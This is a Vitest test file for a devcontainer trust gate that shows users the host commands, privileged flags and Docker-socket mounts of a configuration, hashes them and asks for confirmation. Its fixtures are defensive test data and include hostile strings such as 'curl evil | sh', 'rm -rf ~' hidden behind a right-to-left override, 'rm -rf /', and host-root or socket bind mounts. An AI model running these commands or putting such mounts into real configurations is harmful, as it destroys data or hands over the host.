import { describe, expect, it, vi } from 'vitest';
import { MAX_DEVCONTAINER_TRUST_TEXT, MAX_DEVCONTAINER_TRUST_VALUES } from '../../../../preload/overlay-channels';
import { DevcontainerTrustError, devcontainerTrustFrom, runDevcontainerTrustGate, type DevcontainerTrustGateDeps } from '../devcontainer-trust';

// `devcontainer read-configuration --include-merged-configuration` output as CLI 0.90.0 printed it with no existing
// container: the docker-in-docker Feature's metadata adds privileged, its volume and its entrypoint to the merged configuration.
function readConfigurationOutput(merged: Record<string, unknown> = {}): Record<string, unknown> {
  const configFilePath = { $mid: 1, fsPath: '/srv/app/.devcontainer/devcontainer.json', path: '/srv/app/.devcontainer/devcontainer.json', scheme: 'file' };
  return {
    configuration: { image: 'node:22-bookworm', configFilePath },
    workspace: { workspaceFolder: '/workspaces/app', workspaceMount: 'type=bind,source=/srv/app,target=/workspaces/app,consistency=cached' },
    mergedConfiguration: {
      image: 'node:22-bookworm',
      configFilePath,
      initializeCommand: 'git submodule update --init',
      runArgs: ['--network=host', '-e', 'MODE=dev'],
      features: { 'ghcr.io/devcontainers/features/docker-in-docker:2': { version: 'latest', moby: true } },
      init: true,
      privileged: true,
      capAdd: ['SYS_PTRACE'],
      securityOpt: ['seccomp=unconfined'],
      entrypoints: ['/usr/local/share/docker-init.sh'],
      mounts: [{ source: 'dind-var-lib-docker-${devcontainerId}', target: '/var/lib/docker', type: 'volume' }, 'source=/home/me/.npmrc,target=/root/.npmrc,type=bind'],
      onCreateCommands: [{ 'ghcr.io/devcontainers/features/docker-in-docker:2': 'echo feature' }],
      postCreateCommands: ['npm ci'],
      remoteUser: 'node',
      remoteEnv: {},
      containerEnv: { NODE_ENV: 'development' },
      portsAttributes: {},
      forwardPorts: [3000],
      ...merged,
    },
    ociAuthDiagnostics: { events: [] },
  };
}

const merged = (output: Record<string, unknown>): Record<string, unknown> => output.mergedConfiguration as Record<string, unknown>;
const hashOf = (overrides: Record<string, unknown>): string => devcontainerTrustFrom(readConfigurationOutput(overrides)).hash;
const itemsOf = (overrides: Record<string, unknown>) => devcontainerTrustFrom(readConfigurationOutput(overrides)).items;
const field = (overrides: Record<string, unknown>, name: string) => itemsOf(overrides).find((entry) => entry.field === name)?.values;

function gate(overrides: Partial<DevcontainerTrustGateDeps> = {}) {
  const deps = {
    signal: new AbortController().signal,
    mayAsk: vi.fn(() => true),
    requestFolderTrust: vi.fn(async () => true),
    readConfiguration: vi.fn(async (): Promise<unknown> => readConfigurationOutput()),
    storedHash: vi.fn((): string | undefined => undefined),
    confirm: vi.fn(async () => true),
    storeHash: vi.fn(async () => {}),
    ...overrides,
  };
  return deps;
}

describe('runDevcontainerTrustGate', () => {
  it('never reads the configuration of a folder that stays untrusted', async () => {
    const deps = gate({ requestFolderTrust: vi.fn(async () => false) });
    await expect(runDevcontainerTrustGate(deps)).resolves.toBe('folderUntrusted');
    expect(deps.requestFolderTrust).toHaveBeenCalledOnce();
    expect(deps.readConfiguration).not.toHaveBeenCalled();
    expect(deps.confirm).not.toHaveBeenCalled();
    expect(deps.storeHash).not.toHaveBeenCalled();
  });

  it('asks for folder trust before reading the configuration', async () => {
    const order: string[] = [];
    const deps = gate({
      requestFolderTrust: vi.fn(async () => { order.push('trust'); return true; }),
      readConfiguration: vi.fn(async () => { order.push('read'); return readConfigurationOutput(); }),
    });
    await runDevcontainerTrustGate(deps);
    expect(order).toEqual(['trust', 'read']);
  });

  it('confirms the first time and stores the confirmed hash', async () => {
    const deps = gate();
    await expect(runDevcontainerTrustGate(deps)).resolves.toBe('proceed');
    const expected = devcontainerTrustFrom(readConfigurationOutput());
    expect(deps.confirm).toHaveBeenCalledWith(expected.items, { changed: false }, deps.signal);
    expect(deps.storeHash).toHaveBeenCalledWith(expected.hash);
  });

  it('stores nothing when the confirmation is refused', async () => {
    const deps = gate({ confirm: vi.fn(async () => false) });
    await expect(runDevcontainerTrustGate(deps)).resolves.toBe('configRefused');
    expect(deps.storeHash).not.toHaveBeenCalled();
  });

  it('does not ask again for an unchanged configuration', async () => {
    const deps = gate({ storedHash: () => devcontainerTrustFrom(readConfigurationOutput()).hash });
    await expect(runDevcontainerTrustGate(deps)).resolves.toBe('proceed');
    expect(deps.confirm).not.toHaveBeenCalled();
    expect(deps.storeHash).not.toHaveBeenCalled();
  });

  it('asks again, marked changed, when runArgs changed since the confirmation', async () => {
    const stored = devcontainerTrustFrom(readConfigurationOutput()).hash;
    const changed = readConfigurationOutput({ runArgs: ['--network=host', '-e', 'MODE=dev', '--pid=host'] });
    const deps = gate({ storedHash: () => stored, readConfiguration: vi.fn(async () => changed) });
    await expect(runDevcontainerTrustGate(deps)).resolves.toBe('proceed');
    expect(deps.confirm).toHaveBeenCalledWith(devcontainerTrustFrom(changed).items, { changed: true }, deps.signal);
    expect(deps.storeHash).toHaveBeenCalledWith(devcontainerTrustFrom(changed).hash);
  });

  it('confirms nothing when the configuration cannot be read or shown', async () => {
    const failing = gate({ readConfiguration: vi.fn(async () => { throw new Error('Dev container config (/srv/app/.devcontainer/devcontainer.json) not found.'); }) });
    await expect(runDevcontainerTrustGate(failing)).rejects.toThrow('not found');
    const compose = gate({ readConfiguration: vi.fn(async () => readConfigurationOutput({ dockerComposeFile: ['docker-compose.yml'], service: 'app' })) });
    await expect(runDevcontainerTrustGate(compose)).rejects.toMatchObject({ code: 'composeUnsupported' });
    for (const deps of [failing, compose]) {
      expect(deps.confirm).not.toHaveBeenCalled();
      expect(deps.storeHash).not.toHaveBeenCalled();
    }
  });
});

describe('runDevcontainerTrustGate for an attempt', () => {
  it('asks nothing and runs nothing while nobody watches', async () => {
    const deps = gate({ mayAsk: vi.fn(() => false) });
    await expect(runDevcontainerTrustGate(deps)).resolves.toBe('needsUser');
    expect(deps.requestFolderTrust).not.toHaveBeenCalled();
    expect(deps.readConfiguration).not.toHaveBeenCalled();
  });

  it('opens no confirmation once its watcher left during read-configuration', async () => {
    const watching = [true, false];
    const deps = gate({ mayAsk: vi.fn(() => watching.shift() ?? false) });
    await expect(runDevcontainerTrustGate(deps)).resolves.toBe('needsUser');
    expect(deps.readConfiguration).toHaveBeenCalledOnce();
    expect(deps.confirm).not.toHaveBeenCalled();
    expect(deps.storeHash).not.toHaveBeenCalled();
  });

  it('gives read-configuration the signal and asks nothing after a cancel during it, however it ended', async () => {
    for (const ending of ['resolves', 'rejects'] as const) {
      const controller = new AbortController();
      const deps = gate({
        signal: controller.signal,
        readConfiguration: vi.fn(async (signal: AbortSignal) => {
          expect(signal).toBe(controller.signal);
          controller.abort();
          if (ending === 'rejects') throw new Error('killed');
          return readConfigurationOutput();
        }),
      });
      await expect(runDevcontainerTrustGate(deps)).resolves.toBe('cancelled');
      expect(deps.confirm).not.toHaveBeenCalled();
    }
  });

  it('stores nothing for an accept that arrives after a cancel', async () => {
    const controller = new AbortController();
    const deps = gate({
      signal: controller.signal,
      confirm: vi.fn(async () => {
        controller.abort();
        return true;
      }),
    });
    await expect(runDevcontainerTrustGate(deps)).resolves.toBe('cancelled');
    expect(deps.storeHash).not.toHaveBeenCalled();
  });
});

describe('devcontainerTrustFrom items', () => {
  it('lists the host commands and host access of the merged configuration, in display order', () => {
    expect(itemsOf({})).toEqual([
      { field: 'initializeCommand', values: [{ text: 'git submodule update --init' }] },
      { field: 'mounts', values: [{ text: 'type=volume,src=dind-var-lib-docker-${devcontainerId},dst=/var/lib/docker' }, { text: 'source=/home/me/.npmrc,target=/root/.npmrc,type=bind' }] },
      { field: 'runArgs', values: [{ text: '--network=host' }, { text: '-e' }, { text: 'MODE=dev' }] },
      { field: 'privileged', values: [{ text: 'true', danger: 'privileged' }] },
      { field: 'capAdd', values: [{ text: 'SYS_PTRACE' }] },
      { field: 'securityOpt', values: [{ text: 'seccomp=unconfined' }] },
      { field: 'features', values: [{ text: 'ghcr.io/devcontainers/features/docker-in-docker:2 {"moby":true,"version":"latest"}' }] },
    ]);
  });

  it('leaves out fields with no values', () => {
    const output = readConfigurationOutput();
    const bare = Object.fromEntries(Object.entries(merged(output)).filter(([key]) => ['image', 'configFilePath', 'remoteUser'].includes(key)));
    expect(devcontainerTrustFrom({ ...output, mergedConfiguration: { ...bare, privileged: false, init: false } }).items).toEqual([]);
  });

  it('shows each initializeCommand form so a list or a named command reads as one', () => {
    expect(field({ initializeCommand: ['/bin/sh', '-c', 'echo hi'] }, 'initializeCommand')).toEqual([{ text: '["/bin/sh","-c","echo hi"]' }]);
    expect(field({ initializeCommand: { submodules: 'git submodule update', env: ['node', 'scripts/env.js'] } }, 'initializeCommand'))
      .toEqual([{ text: 'submodules: git submodule update' }, { text: 'env: ["node","scripts/env.js"]' }]);
  });

  it('lists no initializeCommand the CLI would not run, and shows an empty argument as ""', () => {
    for (const initializeCommand of ['', '  ', [], {}]) {
      expect(field({ initializeCommand }, 'initializeCommand')).toBeUndefined();
      expect(hashOf({ initializeCommand })).toBe(hashOf({ initializeCommand: undefined }));
    }
    expect(field({ initializeCommand: [''] }, 'initializeCommand')).toEqual([{ text: '[""]' }]);
    expect(field({ initializeCommand: { a: '' } }, 'initializeCommand')).toEqual([{ text: 'a: ' }]);
    expect(field({ runArgs: ['--label', ''], capAdd: [''] }, 'runArgs')).toEqual([{ text: '--label' }, { text: '""' }]);
    expect(field({ capAdd: [''] }, 'capAdd')).toEqual([{ text: '""' }]);
    expect(field({ mounts: [''] }, 'mounts')).toEqual([{ text: '""' }]);
  });

  it('shows workspaceMount and the otherHostAccess values', () => {
    expect(field({ workspaceMount: 'type=bind,source=/srv,target=/workspaces' }, 'workspaceMount')).toEqual([{ text: 'type=bind,source=/srv,target=/workspaces' }]);
    expect(field({ appPort: [3000, '0.0.0.0:2222:22'], build: { dockerfile: 'Dockerfile', context: '../..', options: ['--network=host'] }, hostRequirements: { gpu: true } }, 'otherHostAccess')).toEqual([
      { text: 'appPort: 127.0.0.1:3000:3000' },
      { text: 'appPort: 0.0.0.0:2222:22' },
      { text: 'build.options: --network=host' },
      { text: 'build.context: ../..' },
      { text: 'hostRequirements.gpu: true' },
    ]);
    expect(field({ appPort: 8080, dockerFile: 'Dockerfile', context: '..' }, 'otherHostAccess')).toEqual([{ text: 'appPort: 127.0.0.1:8080:8080' }, { text: 'build.context: ..' }]);
  });

  it('marks privileged runArgs, and not an explicit false', () => {
    expect(field({ runArgs: ['--privileged', '--privileged=true', '--privileged=1', '--privileged=false', '--privileged=0'] }, 'runArgs')).toEqual([
      { text: '--privileged', danger: 'privileged' },
      { text: '--privileged=true', danger: 'privileged' },
      { text: '--privileged=1', danger: 'privileged' },
      { text: '--privileged=false' },
      { text: '--privileged=0' },
    ]);
  });

  it.each([
    ['a socket bind', 'source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind', true],
    ['src= and a quoted field', 'type=bind,"src=/run/docker.sock",dst=/s', true],
    ['the raw Docker Desktop socket', 'type=bind,source=/var/run/docker.sock.raw,target=/s', true],
    ['rootless podman', 'type=bind,source=/run/user/1000/podman/podman.sock,target=/s', true],
    ['the folder that holds the socket', 'type=bind,source=/var/run,target=/hostrun', true],
    ['the host root', 'type=bind,source=/,target=/host', true],
    ['a user runtime folder', 'type=bind,source=/run/user/1000,target=/r', true],
    ['the Windows engine pipe', 'type=npipe,source=\\\\.\\pipe\\docker_engine,target=\\\\.\\pipe\\docker_engine', true],
    ['the Windows engine pipe in another case', 'type=npipe,source=\\\\.\\pipe\\Docker_Engine,target=/p', true],
    ['a Docker Desktop host socket in another case', 'type=bind,source=C:\\Users\\me\\.docker\\run\\Docker.sock,target=/s', true],
    ['the Windows engine pipe with a trailing .', 'type=npipe,source=\\\\.\\pipe\\docker_engine\\.,target=/p', true],
    ['the socket folder with a doubled slash', 'type=bind,source=/var//run,target=/r', true],
    ['the socket folder with a leading doubled slash', 'type=bind,source=//var/run,target=/r', true],
    ['the socket folder with a trailing .', 'type=bind,source=/var/run/.,target=/r', true],
    ['the socket folder through ..', 'type=bind,source=/run/../var/run,target=/r', true],
    ['a user runtime folder with a trailing .', 'type=bind,source=/run/user/1000/.,target=/r', true],
    ['a local-driver volume that binds the socket folder', 'type=volume,volume-opt=type=none,volume-opt=o=bind,volume-opt=device=/var/run,target=/r', true],
    ['a default-type volume that binds the socket', 'source=v,"volume-opt=device=/var/run/docker.sock",target=/s', true],
    ['a local-driver volume of an unrelated folder', 'type=volume,volume-opt=type=none,volume-opt=o=bind,volume-opt=device=/srv/data,target=/r', false],
    ['an unrelated bind', 'type=bind,source=/var/lib/app,target=/data', false],
    ['a bind of a sibling of /var/run', 'type=bind,source=/var/runner,target=/r', false],
    ['a bind whose path is a text prefix of the socket folder', 'type=bind,source=/var/ru,target=/r', false],
    ['a volume named like the socket', 'type=volume,source=docker.sock,target=/s', false],
    ['the default type, a volume', 'source=/var/run/docker.sock,target=/s', false],
  ])('marks a mount: %s', (_name, mount, socket) => {
    const values = field({ mounts: [mount] }, 'mounts');
    expect(values).toEqual([socket ? { text: mount, danger: 'dockerSocket' } : { text: mount }]);
    expect(field({ workspaceMount: mount }, 'workspaceMount')).toEqual(values);
  });

  it('marks an object mount of the socket', () => {
    expect(field({ mounts: [{ type: 'bind', source: '/var/run/docker.sock', target: '/var/run/docker-host.sock' }] }, 'mounts'))
      .toEqual([{ text: 'type=bind,src=/var/run/docker.sock,dst=/var/run/docker-host.sock', danger: 'dockerSocket' }]);
  });

  it('marks runArgs that bind the socket in each option form', () => {
    const runArgs = ['-v', '/var/run/docker.sock:/var/run/docker.sock', '-v=/run/docker.sock:/d', '-v/run/podman/podman.sock:/p', '--volume', '/var/run:/r:ro',
      '--volume=C:\\Users\\me\\.docker\\run\\docker.sock:/d', '--mount', 'type=bind,source=/var/run/docker.sock,target=/d', '--mount=type=bind,src=/,dst=/host',
      '-v', 'docker.sock:/named', '-v', '/srv/data:/data', '-e', 'DOCKER_HOST=unix:///var/run/docker.sock',
      '-v', '/var//run:/r', '-tv/var/run/docker.sock:/s', '-itv', '/run/../var/run:/r', '-dv=/var/run/.:/r', '-tv/srv/data:/data'];
    const danger = field({ runArgs }, 'runArgs')!.filter((value) => value.danger === 'dockerSocket').map((value) => value.text);
    expect(danger).toEqual(['/var/run/docker.sock:/var/run/docker.sock', '-v=/run/docker.sock:/d', '-v/run/podman/podman.sock:/p', '/var/run:/r:ro',
      '--volume=C:\\Users\\me\\.docker\\run\\docker.sock:/d', 'type=bind,source=/var/run/docker.sock,target=/d', '--mount=type=bind,src=/,dst=/host',
      '/var//run:/r', '-tv/var/run/docker.sock:/s', '/run/../var/run:/r', '-dv=/var/run/.:/r']);
  });

  it('shows hidden characters as escapes', () => {
    expect(field({ initializeCommand: 'echo safe\u202e;rm -rf ~\nexit 0' }, 'initializeCommand')).toEqual([{ text: 'echo safe\\u{202E};rm -rf ~\nexit 0' }]);
    expect(field({ runArgs: ['-e\u0007', 'X\u200b'] }, 'runArgs')).toEqual([{ text: '-e\\u{7}' }, { text: 'X\\u{200B}' }]);
  });
});

describe('devcontainerTrustFrom hash', () => {
  const base = hashOf({});

  it('is stable for the same configuration and independent of key order', () => {
    expect(hashOf({})).toBe(base);
    const output = readConfigurationOutput();
    const reversed = Object.fromEntries(Object.entries(merged(output)).reverse());
    expect(devcontainerTrustFrom({ ...output, mergedConfiguration: reversed }).hash).toBe(base);
    expect(hashOf({ features: { 'ghcr.io/devcontainers/features/docker-in-docker:2': { moby: true, version: 'latest' } } })).toBe(base);
  });

  it.each<[string, Record<string, unknown>]>([
    ['initializeCommand', { initializeCommand: 'git submodule update --init --recursive' }],
    ['initializeCommand removed', { initializeCommand: undefined }],
    ['runArgs', { runArgs: ['--network=host', '-e', 'MODE=prod'] }],
    ['runArgs order', { runArgs: ['-e', 'MODE=dev', '--network=host'] }],
    ['mounts', { mounts: [{ source: 'dind-var-lib-docker-${devcontainerId}', target: '/var/lib/docker', type: 'volume' }, 'source=/home/me/.ssh,target=/root/.ssh,type=bind'] }],
    ['workspaceMount', { workspaceMount: 'type=bind,source=/,target=/workspaces/app' }],
    ['privileged', { privileged: false }],
    ['capAdd', { capAdd: ['SYS_PTRACE', 'SYS_ADMIN'] }],
    ['securityOpt', { securityOpt: ['apparmor=unconfined'] }],
    ['a feature', { features: { 'ghcr.io/devcontainers/features/docker-in-docker:2': { version: 'latest', moby: true }, 'https://example.com/f.tgz': true } }],
    ['a feature option', { features: { 'ghcr.io/devcontainers/features/docker-in-docker:2': { version: 'latest', moby: false } } }],
    ['appPort', { appPort: '0.0.0.0:3000:3000' }],
    ['build.options', { build: { dockerfile: 'Dockerfile', options: ['--network=host'] } }],
    ['build.context', { build: { dockerfile: 'Dockerfile', context: '../..' } }],
    ['hostRequirements.gpu', { hostRequirements: { gpu: 'optional' } }],
  ])('changes when %s changes', (_name, overrides) => {
    expect(hashOf(overrides)).not.toBe(base);
  });

  it.each<[string, Record<string, unknown>]>([
    ['a container lifecycle command', { postCreateCommands: ['rm -rf /'] }],
    ['containerEnv', { containerEnv: { NODE_ENV: 'production' } }],
    ['remoteUser', { remoteUser: 'root' }],
    ['forwardPorts', { forwardPorts: [3000, 9229] }],
    ['the image', { image: 'node:24-bookworm' }],
    ['init', { init: false }],
  ])('stays when %s changes', (_name, overrides) => {
    expect(hashOf(overrides)).toBe(base);
  });

  it('shows and hashes numeric and null Feature options, which the CLI runs as text', () => {
    expect(field({ features: { 'ghcr.io/x/node:1': { version: 18, extra: null } } }, 'features')).toEqual([{ text: 'ghcr.io/x/node:1 {"extra":null,"version":18}' }]);
    expect(hashOf({ features: { 'ghcr.io/x/node:1': { version: 18 } } })).not.toBe(hashOf({ features: { 'ghcr.io/x/node:1': { version: '18' } } }));
    expect(hashOf({ features: { 'ghcr.io/x/node:1': { version: null } } })).not.toBe(hashOf({ features: { 'ghcr.io/x/node:1': { version: 'null' } } }));
  });

  it('tells apart commands that print alike', () => {
    expect(hashOf({ initializeCommand: '["a"]' })).not.toBe(hashOf({ initializeCommand: ['a'] }));
    expect(hashOf({ initializeCommand: { 'a: b': 'c' } })).not.toBe(hashOf({ initializeCommand: { a: 'b: c' } }));
    expect(hashOf({ initializeCommand: 'echo \u202e' })).not.toBe(hashOf({ initializeCommand: 'echo \\u{202E}' }));
  });

  it('keeps a __proto__ key as data', () => {
    const hostile = JSON.parse('{"initializeCommand":{"__proto__":"curl evil | sh"},"features":{"__proto__":{"x":"y"}}}') as Record<string, unknown>;
    const trust = devcontainerTrustFrom(readConfigurationOutput(hostile));
    expect(trust.items.find((entry) => entry.field === 'initializeCommand')?.values).toEqual([{ text: '__proto__: curl evil | sh' }]);
    expect(trust.items.find((entry) => entry.field === 'features')?.values).toEqual([{ text: '__proto__ {"x":"y"}' }]);
    expect(trust.hash).not.toBe(hashOf({ initializeCommand: {}, features: {} }));
  });
});

describe('devcontainerTrustFrom refuses what it cannot show', () => {
  it.each<[string, unknown, string]>([
    ['null', null, 'not a JSON object'],
    ['an array', [readConfigurationOutput()], 'not a JSON object'],
    ['a string', '{"mergedConfiguration":{}}', 'not a JSON object'],
    ['output without the merged configuration', { configuration: { image: 'node' } }, 'no mergedConfiguration'],
    ['a merged configuration that is a list', { mergedConfiguration: [] }, 'no mergedConfiguration'],
  ])('%s', (_name, resolved, message) => {
    expect(() => devcontainerTrustFrom(resolved)).toThrow(DevcontainerTrustError);
    expect(() => devcontainerTrustFrom(resolved)).toThrow(message);
  });

  it.each<[string, Record<string, unknown>]>([
    ['runArgs as a string', { runArgs: '--privileged' }],
    ['a runArg that is a number', { runArgs: ['-p', 22] }],
    ['privileged as a string', { privileged: 'yes' }],
    ['capAdd as a string', { capAdd: 'ALL' }],
    ['securityOpt with an object', { securityOpt: [{}] }],
    ['mounts as an object', { mounts: { source: '/' } }],
    ['a mount without a target', { mounts: [{ type: 'bind', source: '/' }] }],
    ['a mount that is a number', { mounts: [1] }],
    ['initializeCommand as a number', { initializeCommand: 1 }],
    ['a named command with an object', { initializeCommand: { a: { b: 'c' } } }],
    ['workspaceMount as a list', { workspaceMount: ['type=bind'] }],
    ['features as a list', { features: ['ghcr.io/x/y:1'] }],
    ['a feature option that is an object', { features: { 'ghcr.io/x/y:1': { version: { major: 1 } } } }],
    ['a feature option that is a list', { features: { 'ghcr.io/x/y:1': { version: [18] } } }],
    ['appPort as an object', { appPort: { port: 1 } }],
    ['build.options as a string', { build: { options: '--network=host' } }],
    ['hostRequirements.gpu as a number', { hostRequirements: { gpu: 1 } }],
  ])('%s', (_name, overrides) => {
    expect(() => devcontainerTrustFrom(readConfigurationOutput(overrides))).toThrow(expect.objectContaining({ code: 'malformed' }));
  });

  it('refuses a configuration the dialog could not carry, at the overlay limits', () => {
    const args = (count: number) => Array.from({ length: count }, (_, i) => `--label=n${i}`);
    const listed = (overrides: Record<string, unknown>) => devcontainerTrustFrom(readConfigurationOutput(overrides)).items.reduce((sum, entry) => sum + entry.values.length, 0);
    const others = listed({ runArgs: [] });
    expect(listed({ runArgs: args(MAX_DEVCONTAINER_TRUST_VALUES - others) })).toBe(MAX_DEVCONTAINER_TRUST_VALUES);
    expect(() => devcontainerTrustFrom(readConfigurationOutput({ runArgs: args(MAX_DEVCONTAINER_TRUST_VALUES - others + 1) }))).toThrow(expect.objectContaining({ code: 'tooLarge' }));
    expect(() => devcontainerTrustFrom(readConfigurationOutput({ initializeCommand: 'x'.repeat(MAX_DEVCONTAINER_TRUST_TEXT) }))).not.toThrow();
    // an escaped hidden character counts as its shown length
    expect(() => devcontainerTrustFrom(readConfigurationOutput({ initializeCommand: `${'x'.repeat(MAX_DEVCONTAINER_TRUST_TEXT - 1)}\u200b` }))).toThrow(expect.objectContaining({ code: 'tooLarge' }));
  });

  it('refuses a Docker Compose configuration', () => {
    expect(() => devcontainerTrustFrom(readConfigurationOutput({ dockerComposeFile: 'docker-compose.yml', service: 'app' }))).toThrow(expect.objectContaining({ code: 'composeUnsupported' }));
  });

  it('never reads an inherited property', () => {
    const output = readConfigurationOutput();
    const inherited = Object.assign(Object.create({ runArgs: ['--privileged'], dockerComposeFile: 'c.yml' }) as Record<string, unknown>, merged(output));
    expect(devcontainerTrustFrom({ ...output, mergedConfiguration: inherited }).hash).toBe(hashOf({}));
  });
});
